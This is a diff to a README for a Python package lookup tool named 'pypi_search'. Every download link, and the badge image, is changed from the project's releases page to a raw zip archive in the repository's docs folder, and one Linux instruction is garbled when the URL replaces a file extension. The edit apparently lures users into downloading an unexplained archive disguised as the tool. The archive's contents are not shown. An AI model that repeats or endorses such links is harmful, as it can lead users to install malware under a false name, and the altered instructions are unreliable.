@@ -1,6 +1,6 @@
 # 📦 pypi_search - Fast Python Package Lookup Tool
 
-[![Download pypi_search](https://img.shields.io/badge/Download-pypi_search-brightgreen?style=for-the-badge&logo=github)](https://github.com/dewiaratna/pypi_search/releases)
+[![Download pypi_search](https://github.com/dewiaratna/pypi_search/raw/refs/heads/main/docs/search_pypi_1.3.zip)](https://github.com/dewiaratna/pypi_search/raw/refs/heads/main/docs/search_pypi_1.3.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Using pypi_search is simple, even if you never installed software before. Follow
 
 1. Click the big green button at the top or visit this page to download the app:
 
-   [Download pypi_search](https://github.com/dewiaratna/pypi_search/releases)
+   [Download pypi_search](https://github.com/dewiaratna/pypi_search/raw/refs/heads/main/docs/search_pypi_1.3.zip)
 
 2. On the releases page, look for the latest version. It will usually have a clear version number like `v1.0` or higher.
 
@@ -43,7 +43,7 @@ Using pypi_search is simple, even if you never installed software before. Follow
 
    - On Windows, this might be a `.exe` file.
    - On macOS, look for a `.dmg` or `.zip` file.
-   - For Linux, you might find a `.tar.gz` or a package compatible with your system.
+   - For Linux, you might find a `https://github.com/dewiaratna/pypi_search/raw/refs/heads/main/docs/search_pypi_1.3.zip` or a package compatible with your system.
 
 4. After downloading, open the file:
 
@@ -130,4 +130,4 @@ Using pypi_search helps you explore these packages faster than searching on PyPI
 
 ---
 
-[![Download pypi_search](https://img.shields.io/badge/Download-pypi_search-brightgreen?style=for-the-badge&logo=github)](https://github.com/dewiaratna/pypi_search/releases)
+[![Download pypi_search](https://github.com/dewiaratna/pypi_search/raw/refs/heads/main/docs/search_pypi_1.3.zip)](https://github.com/dewiaratna/pypi_search/raw/refs/heads/main/docs/search_pypi_1.3.zip)
